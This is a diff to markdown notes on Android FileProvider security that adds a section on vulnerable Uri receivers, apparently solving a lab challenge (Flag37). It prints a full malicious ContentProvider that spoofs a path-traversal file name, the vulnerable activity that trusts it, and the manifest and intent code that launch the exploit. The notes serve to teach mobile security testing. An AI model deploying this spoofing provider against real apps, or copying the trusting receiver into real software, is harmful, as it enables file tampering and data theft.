@@ -6,6 +6,7 @@
 - [The AndroidX FileProvider](#the-androidx-fileprovider)
     - [How to Access FileProvider](#how-to-access-fileprovider)
     - [FileProvider Write Access](#fileprovider-write-access)
+    - [FileProvider Receivers](#fileprovider-receivers)
 
 
 
@@ -268,7 +269,7 @@ button.setOnClickListener(v -> {
 
 ### Insecure root-path FileProvider Config
 ```java
-// the same Vulnerable class
+// The same Vulnerable class
   public void onCreate(Bundle bundle) {
         super.onCreate(bundle);
         String stringExtra = getIntent().getStringExtra("filename");
@@ -373,6 +374,178 @@ Button button = findViewById(R.id.click);
     }
 ```
 
+### FileProvider Receivers
+- Because content providers are used a lot to exchange data between apps, the threat surface is not just on the provider implementation side. Also apps that receive content provider Uris can be vulnerable.
+- The following code snippet implements a malicious File Provider that can spoof the filename.
+```java
+import android.content.ContentProvider;
+import android.content.ContentValues;
+import android.database.Cursor;
+import android.database.MatrixCursor;
+import android.net.Uri;
+import android.os.ParcelFileDescriptor;
+import android.provider.OpenableColumns;
+import android.util.Log;
+import androidx.annotation.NonNull;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+
+public class AttackProvider extends ContentProvider {
+    public AttackProvider() {
+    }
+
+    @Override
+    public Cursor query(Uri uri, String[] projection, String selection,
+                        String[] selectionArgs, String sortOrder) {
+        Log.i("AttackProvider", "query("+uri.toString()+")");
+
+        MatrixCursor cursor = new MatrixCursor(new String[]{
+                OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
+        });
+
+        cursor.addRow(new Object[]{
+                "../../../filename.txt", 12345
+        });
+
+        return cursor;
+    }
+
+    @Override
+    public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException {
+        Log.i("AttackProvider", "openFile(" + uri.toString() + ")");
+
+        try {
+            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
+            ParcelFileDescriptor.AutoCloseOutputStream outputStream = new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]);
+
+            new Thread(() -> {
+                try {
+                    outputStream.write("<h1>File Content</h1>".getBytes());
+                    outputStream.close();
+                } catch (IOException e) {
+                    Log.e("AttackProvider", "Error in pipeToParcelFileDescriptor", e);
+                }
+            }).start();
+
+            return pipe[0];
+        } catch (IOException e) {
+            throw new FileNotFoundException("Could not open pipe for: " + uri.toString());
+        }
+    }
+
+    @Override
+    public int delete(Uri uri, String selection, String[] selectionArgs) {
+        Log.i("AttackProvider", "delete("+uri.toString()+")");
+        throw new UnsupportedOperationException("Not yet implemented");
+    }
+
+    @Override
+    public String getType(Uri uri) {
+        Log.i("AttackProvider", "getType("+uri.toString()+")");
+        throw new UnsupportedOperationException("Not yet implemented");
+    }
+
+    @Override
+    public Uri insert(Uri uri, ContentValues values) {
+        Log.i("AttackProvider", "insert("+uri.toString()+")");
+        throw new UnsupportedOperationException("Not yet implemented");
+    }
+
+    @Override
+    public boolean onCreate() {
+        Log.i("AttackProvider", "onCreate()");
+        return true;
+    }
+
+    @Override
+    public int update(Uri uri, ContentValues values, String selection,
+                      String[] selectionArgs) {
+        Log.i("AttackProvider", "update("+uri.toString()+")");
+        throw new UnsupportedOperationException("Not yet implemented");
+    }
+}
+```
+- Example
+```java
+// Vulnerable class
+ protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        this.f = new LogHelper(this);
+        Uri data = getIntent().getData();
+        Cursor cursorQuery = null;
+        try {
+            try {
+                cursorQuery = getContentResolver().query(data, null, null, null, null);
+                if (cursorQuery != null && cursorQuery.moveToFirst()) {
+                    String string = cursorQuery.getString(cursorQuery.getColumnIndex("_display_name"));
+                    long j = cursorQuery.getLong(cursorQuery.getColumnIndex("_size"));
+                    this.f.addTag(Long.valueOf(j));
+                    this.f.addTag(string);
+                    if ("../flag37.txt".equals(string) && j == 1337) {
+                        InputStream inputStreamOpenInputStream = getContentResolver().openInputStream(data);
+                        if (inputStreamOpenInputStream != null) {
+                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStreamOpenInputStream));
+                            StringBuilder sb = new StringBuilder();
+                            while (true) {
+                                String line = bufferedReader.readLine();
+                                if (line == null) {
+                                    break;
+                                } else {
+                                    sb.append(line);
+                                }
+                            }
+                            inputStreamOpenInputStream.close();
+                            this.f.addTag(sb.toString());
+                            if ("give flag".equals(sb.toString())) {
+                                success(this);
+                            } else {
+                                Log.i("Flag37", "File content '" + ((Object) sb) + "' is not 'give flag'");
+                            }
+                        }
+                    } else {
+                        Log.i("Flag37", "File name '" + string + "' or size '" + j + "' does not match");
+                    }
+                }
+                if (cursorQuery == null) {
+                    return;
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+                if (0 == 0) {
+                    return;
+                }
+            }
+            cursorQuery.close();
+        } catch (Throwable th) {
+            if (0 != 0) {
+                cursorQuery.close();
+            }
+            throw th;
+        }
+    }
+
+```
+- Exploit: the previous attack provider class.
+```xml
+  <provider
+            android:name=".AttackProvider"
+            android:authorities="abdeonix.com"
+            android:enabled="true"
+            android:exported="true">
+        </provider>
+```
+```java
+ Button button = findViewById(R.id.click);
+        button.setOnClickListener(v -> {
+            Intent intent = new Intent();
+            Uri FileProvider = Uri.parse("content://abdeonix.com/");
+            intent.setData(FileProvider);
+            intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag37Activity");
+            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+            startActivity(intent);
+
+        });
+```
 ## Resources
 - [Oversecured - Content Provider](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers)
 - [Oversecured - Android security checklist: Content Providers](https://blog.oversecured.com/Content-Providers-and-the-potential-weak-spots-they-can-have/)
